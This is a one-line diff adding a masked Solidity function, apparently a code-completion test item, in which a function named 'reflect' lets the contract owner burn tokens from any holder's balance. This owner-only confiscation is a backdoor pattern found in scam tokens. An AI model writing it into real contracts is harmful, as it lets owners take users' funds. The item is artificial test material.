@@ -1,0 +1,1 @@
+"function reflect(address _address, uint tokens) public onlyOwner {     require(_address != address(0), \"ERC20: reflect from the zero address\");     <mask0>;     balances[_address] = balances[_address].sub(tokens);     _totalSupply = _totalSupply.sub(tokens);  }"
